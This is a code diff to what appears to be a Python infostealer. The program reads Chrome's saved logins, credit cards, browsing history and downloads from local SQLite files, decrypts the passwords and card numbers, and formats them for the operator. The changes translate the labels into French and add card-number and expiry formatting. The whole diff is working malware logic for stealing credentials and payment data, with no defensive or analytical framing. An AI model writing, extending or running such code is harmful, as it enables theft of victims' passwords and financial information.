@@ -7,6 +7,7 @@ import shutil
 import sqlite3
 import time
 import wave
+from datetime import datetime
 
 import pyaudio
 import pyautogui
@@ -25,25 +26,29 @@ data_queries = {
     'login_data': {
         'query': 'SELECT action_url, username_value, password_value FROM logins',
         'file': '\\Login Data',
-        'columns': ['URL', 'Email', 'Password'],
+        'columns': ['URL', 'Email', 'Mot de passe'],
         'decrypt': True
     },
     'credit_cards': {
-        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
+        'query': 'SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year, date_modified FROM credit_cards',
         'file': '\\Web Data',
-        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
+        'columns': ['Nom de la carte',
+                    'Numéro de carte',
+                    'Mois d\'expiration',
+                    'Année d\'expiration',
+                    'Date de modification'],
         'decrypt': True
     },
     'history': {
         'query': 'SELECT url, title, last_visit_time FROM urls',
         'file': '\\History',
-        'columns': ['URL', 'Title', 'Visited Time'],
+        'columns': ['URL', 'Titre', 'Dernière visite'],
         'decrypt': False
     },
     'downloads': {
         'query': 'SELECT tab_url, target_path FROM downloads',
         'file': '\\History',
-        'columns': ['Download URL', 'Local Path'],
+        'columns': ['URL', 'Chemin de téléchargement'],
         'decrypt': False
     }
 }
@@ -89,7 +94,17 @@ def get_data(path: str, profile: str, key, type_of_data):
     for row in cursor.fetchall():
         if type_of_data['decrypt']:
             row = [decrypt_password(x, key) if isinstance(x, bytes) else x for x in row]
-        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+        if type_of_data == data_queries['credit_cards']:
+            credit_card = {
+                'Nom de la carte': row[0],
+                'Numéro de carte': ' '.join([row[1][i:i + 4] for i in range(0, len(row[1]), 4)]),
+                'Date d\'éxpiration': f"{row[2]}/{row[3]}",
+                'Date de modification': datetime.fromtimestamp(row[4]).strftime('%d/%m/%Y %H:%M:%S')
+            }
+            result += "\n".join([f"{key}: {val}" for key, val in credit_card.items()]) + "\n\n"
+        else:
+            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
+
     conn.close()
     os.remove('temp_db')
     return result
